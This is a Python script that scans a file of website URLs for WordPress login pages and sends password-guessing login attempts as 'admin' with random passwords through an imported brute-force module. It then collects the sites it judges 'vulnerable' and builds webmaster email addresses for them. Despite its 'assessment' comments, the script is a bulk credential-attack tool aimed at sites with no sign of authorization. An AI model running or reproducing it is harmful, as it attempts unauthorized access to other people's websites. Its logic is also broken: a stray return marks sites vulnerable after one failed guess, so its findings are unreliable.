import requests
import random
import wp_crack


# determines if site is WordPress... uses default "wp-login.php" endpoint.
def check_if_wordpress(site_url):
  try:
    r = requests.post(site_url + "/wp-login.php", verify=False)
  except:
    print(TimeoutError)
    return 0
  if r.status_code == 200:
    return True
  else:
    return False


# attempts a small, quick brute-force attack to assess vulnerability. this is not intended to actually penetrate the site. returns true if site may be vulnerable
def check_vulnerability(wp_url):

  if check_if_wordpress(wp_url) != True:
    print("this is not a wordpress site.")
    return

  wp_url += "/wp-login.php" # change if needed

  count = 0

  min_length = 8
  max_length = 8
  charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

  while count < 5:
    passwd = wp_crack.make_random_password(min_length, max_length, charset)
    attempt = wp_crack.make_request(passwd, "admin", wp_url)
    if attempt == True:
        return True
        break
    elif attempt == 401:
      print("This site is protected.")
      return False
      break
    else:
        count+=1

    return True


# checks a list of sites for vulnerability, then prints list of vulnerable sites + emails. returns array of vulnerable sites.
def check_list_vulnerability(wp_sites):
  vulnerable_sites = []
  emails = []

  total = 0
  num_vulnerable = 0
  num_wordpress = 0

  for site in wp_sites:
    total += 1
    print(site)
    if check_if_wordpress(site):
      num_wordpress += 1
      if check_vulnerability(site):
        num_vulnerable += 1
        print("VULNERABLE: " + site)
        vulnerable_sites.append(site)
        domain_index = site.find("//") + 2
        emails.append("webmaster@" + site[domain_index:])
    else:
      print("This is not wordpress.")

    print("WP: " + str(num_wordpress) + " | VULNERABLE: " + str(num_vulnerable) + " | TOTAL: " + str(total))

  print(vulnerable_sites)
  print(emails)
  print("\nLIST: \n")
  return vulnerable_sites


# extracts list from comma-delimited file, then runs check_list_vulnerability with contents. make sure to end file with a newline
def check_list_from_file(filename):
    sites_file = open(filename, 'r')
    sites_list = sites_file.readlines()
    for i in range (0, len(sites_list)):
      sites_list[i] = sites_list[i][:-1] # removes newline
    return check_list_vulnerability(sites_list)


print(check_list_from_file("notdone.txt"))
